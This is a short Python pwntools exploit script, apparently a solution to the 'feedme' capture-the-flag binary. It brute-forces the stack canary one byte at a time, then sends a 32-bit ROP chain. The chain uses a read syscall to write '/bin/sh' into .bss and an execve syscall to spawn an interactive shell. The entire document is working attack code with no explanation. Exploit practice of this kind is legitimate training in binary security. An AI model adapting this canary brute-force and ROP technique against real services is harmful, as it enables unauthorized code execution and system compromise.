#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./feedme")

canary = "\x00"
for j in range(1, 4):
    for i in range(0x00, 0xFF+1):
        p.sendafter("FEED ME!\n", p8(0x21 + j))
        p.send('A'*0x20+ canary + p8(i))
        p.recvline()
        r = p.recvline()
        if "YUM, " in r:
            print p8(i)
            canary += p8(i)
            break
        else:
            continue

int_0x80 = 0x806fa20
pop_eax = 0x80bb496
pop_edx_ecx_ebx = 0x0806f370
binsh = "/bin/sh"
read = 0x806d870
bss = 0x080eb58a

pay = 'A'*0x20 + canary + 'B'*0xc 
pay += p32(pop_eax) + p32(0x03)
pay += p32(pop_edx_ecx_ebx) + p32(len(binsh)) + p32(bss) + p32(0)
pay += p32(int_0x80)
pay += p32(pop_eax) + p32(0x0b)
pay += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bss)
pay += p32(int_0x80)

p.sendafter("FEED ME!\n", p8(len(pay)))
p.send(pay)
p.sendafter("...\n", binsh)

p.interactive()
